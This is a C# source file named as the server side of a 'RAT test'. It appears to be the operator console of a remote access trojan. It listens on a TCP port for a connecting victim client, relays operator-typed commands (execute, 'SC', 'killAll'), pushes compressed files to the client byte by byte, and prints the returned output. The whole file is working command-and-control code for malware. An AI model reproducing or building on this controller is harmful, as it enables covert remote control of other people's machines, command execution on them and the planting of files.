using System;
using System.Collections.Generic;
using System.Data;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;
using System.IO.Compression;

namespace RAT_test_serverside
{
    class Program
    {
        private static string cmd;
        private static TcpListener listener;
        private static TcpClient client;

        private static bool keepAlive = true;

        static void Main(string[] args)
        {
            //Create the tcplistener and start it 
            listener = new TcpListener(6258);
            listener.Start();

            //Infinte loop that waits for connection and prints out the data
            while (true) {
                Console.WriteLine("Awaiting connection:");
                client = listener.AcceptTcpClient();

                //Create the streams
                StreamReader sr = new StreamReader(client.GetStream(),Encoding.ASCII);
                StreamWriter sw = new StreamWriter(client.GetStream(),Encoding.ASCII);

                try
                {
                    //Get the data and print it out
                    string data = sr.ReadLine();
                    Console.WriteLine("Connected to: " + data);

                }
                catch (Exception e)
                {
                    Console.WriteLine(e);
                }

                while (keepAlive && client.Connected)
                {
                    Console.WriteLine();
                    Console.WriteLine("Enter Command:");
                    cmd = Console.ReadLine();

                    if (cmd.StartsWith("E+"))
                    {
                        //Send data
                        try
                        {
                            Console.WriteLine("Sending: " + cmd);
                            sw.WriteLine(cmd);
                            sw.Flush();
                        }
                        catch (Exception e) { }
                    }

                    if (cmd.StartsWith("S"))
                    {
                        string[] sendArgs = cmd.Split(Convert.ToChar("*"));

                        FileStream fs = new FileStream(sendArgs[1], FileMode.Open, FileAccess.Read);
                        byte[] data = compressBytes(readToBytes(fs));
                        Console.WriteLine(data.Length);

                        sw.WriteLine("S*" + sendArgs[2]);
                        sw.Flush();
                        
                        sw.WriteLine(data.Length); //Send the file size
                        sw.Flush();

                        foreach (byte b in data)
                        {
                            sw.WriteLine(b);
                        } 
                        sw.Flush();
                    }

                    if (cmd.StartsWith("killAll"))
                    {
                        Console.WriteLine("Sending: " + cmd);
                        sw.WriteLine(cmd);
                        sw.Flush();
                    }

                    if (cmd.StartsWith("C"))
                    {
                        try
                        {
                            Console.WriteLine("Sending SC Command!");
                            sw.WriteLine(cmd);
                            sw.Flush();
                        }
                        catch (Exception e) { }
                    }

                    //Get data
                    try
                    {
                        Console.WriteLine();
                        Console.WriteLine("OUTPUT:");

                        string data = String.Empty;
                        data = sr.ReadLine();
                        while (sr.Peek() != -1)
                        {
                            Console.WriteLine(data);
                            data = sr.ReadLine();
                        }
                    } catch(Exception e) { }
                }
                client.Close();
                Console.WriteLine("Client Disconnect");
            }
        }

        public static byte[] readToBytes(Stream inputStream)
        {
            using (MemoryStream ms = new MemoryStream())
            {
                inputStream.CopyTo(ms);
                return ms.ToArray();
                ms.SetLength(0);
            }
        }

        public static byte[] compressBytes(byte[] data)
        {
            MemoryStream ms = new MemoryStream();
            using (DeflateStream ds = new DeflateStream(ms, CompressionLevel.Optimal))
            {
                ds.Write(data, 0, data.Length);
            }
            return ms.ToArray();
        }

    }
}
